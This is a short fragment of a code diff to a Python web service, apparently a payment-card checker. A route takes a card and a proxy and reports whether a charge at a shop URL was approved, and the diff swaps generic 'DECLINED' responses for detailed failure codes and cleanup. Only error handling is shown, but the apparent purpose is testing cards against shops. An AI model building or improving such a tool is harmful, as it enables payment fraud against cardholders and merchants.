+            return _resp(resp, approved=apv, charged=chg, price=price_str, elapsed_ms=elapsed_ms)
 
-    return _resp("DECLINED", price="0 USD")
+        return _fail("UNKNOWN_BODY", shop=shop_url, body=body[:800], price=price_str)
+
+    except Exception as e:
+        return _fail("TOP_EXC", shop=shop_url, err=str(e)[:150])
+    finally:
+        try: session.close()
+        except Exception: pass
 
 # ─────────────────────────────────────────────────────────────────────────────
 # 🌐 ROUTES
@@ -917,7 +884,7 @@ def route_check():
         if not card: return _resp("MISSING_CARD")
         return _run_check(card, proxy)
     except Exception as e:
-        return _resp("DECLINED", price="0 USD")
+        return _fail("ROUTE_EXC", err=str(e)[:150])
     finally:
         _dec_busy()
 
